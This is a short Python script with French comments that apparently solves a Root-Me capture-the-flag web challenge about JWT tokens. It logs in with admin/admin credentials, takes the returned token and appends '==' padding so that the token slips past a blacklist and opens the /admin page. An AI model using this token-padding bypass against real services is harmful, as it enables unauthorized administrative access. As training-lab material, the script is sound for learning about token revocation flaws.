import requests
import jwt

header={"username":"admin","password":"admin"} # Le header demandé
r=requests.post("http://challenge01.root-me.org/web-serveur/ch63/login",json=header) # Le message normal

print(r.text) 
montoken=r.text.split("\"")[3] # On récupère le token apres le 3eme ' " '
 

header={'Authorization':'Bearer '+montoken+'=='} # l'astuce du == pour ne pas etre blacklisté !

r=requests.get('http://challenge01.root-me.org/web-serveur/ch63/admin',headers=header)
print(r.text)
